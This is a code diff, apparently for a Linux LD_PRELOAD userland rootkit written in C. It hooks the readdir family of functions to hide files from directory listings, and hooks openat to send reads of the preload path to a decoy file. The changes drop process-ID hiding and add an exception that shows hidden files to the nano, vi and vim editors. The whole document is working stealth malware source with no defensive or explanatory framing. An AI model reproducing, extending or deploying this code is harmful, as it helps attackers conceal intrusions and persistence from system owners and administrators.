@@ -7,8 +7,8 @@
 #include <dlfcn.h>
 #include <sys/types.h>
 
+extern char *program_invocation_short_name;
 extern __thread int inside_hook;
-int is_target_pid(const char *name);
 
 static int should_hide_file(const char *name) {
     if (!name) return 0;
@@ -35,10 +35,19 @@ struct dirent *readdir(DIR *dirp) {
 
     if (inside_hook) return orig(dirp);
 
+  if (program_invocation_short_name && (
+        strcmp(program_invocation_short_name, "nano") == 0 ||
+        strcmp(program_invocation_short_name, "vi") == 0 ||
+        strcmp(program_invocation_short_name, "vim") == 0)) {
+        
+        return orig(dirp); // Show the file normally
+    }
+
+
     inside_hook = 1;
     struct dirent *e;
     while ((e = orig(dirp))) {
-        if (should_hide_file(e->d_name) || is_target_pid(e->d_name)) continue;
+        if (should_hide_file(e->d_name)) continue;
         inside_hook = 0;
         return e;
     }
@@ -55,7 +64,7 @@ struct dirent64 *readdir64(DIR *dirp) {
     inside_hook = 1;
     struct dirent64 *e;
     while ((e = orig(dirp))) {
-        if (should_hide_file(e->d_name) || is_target_pid(e->d_name)) continue;
+        if (should_hide_file(e->d_name)) continue;
         inside_hook = 0;
         return e;
     }
@@ -75,7 +84,7 @@ int readdir_r(DIR *dirp, struct dirent *entry, struct dirent **result) {
     inside_hook = 1;
     int ret = orig(dirp, entry, result);
     if (ret == 0 && *result != NULL) {
-        if (should_hide_file((*result)->d_name) || is_target_pid((*result)->d_name)) {
+        if (should_hide_file((*result)->d_name)) {
             inside_hook = 0;
             return readdir_r(dirp, entry, result);
         }
@@ -138,3 +147,4 @@ int openat(int dirfd, const char *pathname, int flags, ...) {
     if (pathname && strstr(pathname, PRELOAD_PATH)) return orig_openat(dirfd, DUMMY_PRELOAD, flags, mode);
     return orig_openat(dirfd, pathname, flags, mode);
 }
+
